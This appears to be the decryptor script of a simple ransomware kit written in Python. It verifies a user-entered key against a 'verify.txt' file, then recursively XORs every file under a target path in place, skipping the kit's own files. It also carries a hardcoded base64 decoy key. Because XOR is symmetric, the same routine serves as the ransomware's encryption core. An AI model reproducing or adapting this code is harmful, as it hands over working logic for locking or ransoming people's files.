import os

def decipher(file,key):
    try:
        data=bytearray(open(file,"rb").read())
        while len(key)<len(data):
            key+=key
        for i in range(len(data)):
            data[i]^=ord(key[i])
        open(file,"wb").write(data)
    except:
        pass
    
def saveme(way):
    directory=os.listdir(way)
    for dir in directory:
        if dir in exclu:
            continue
        if os.path.isdir(f"{way}/{dir}"):
            saveme(f"{way}/{dir}/")
        else:
            decipher(f"{way}/{dir}",key)
def goodkey(key):
    try:
        decipher(path+"/verify.txt",key)
        if open(path+"/verify.txt","r").read()== "That's the good key!":
            return True
        else:
            decipher(path+"/verify.txt",key)
            return False
    except:
        return False


exclu=["ransom.py","save.py","path.txt"]
path= open("path.txt","r").read()
key = "dGhpcyBpcyBub3QgdGhlIGtleSB5b3Ugc3R1cGlkIGR1bWJhc3Mg8J+Qkg=="
key = input("Enter the key: ")

if goodkey(key):
    os.remove(path+"/verify.txt")
    saveme(path)
    print("Done!")
else:
    print("Wrong key!")
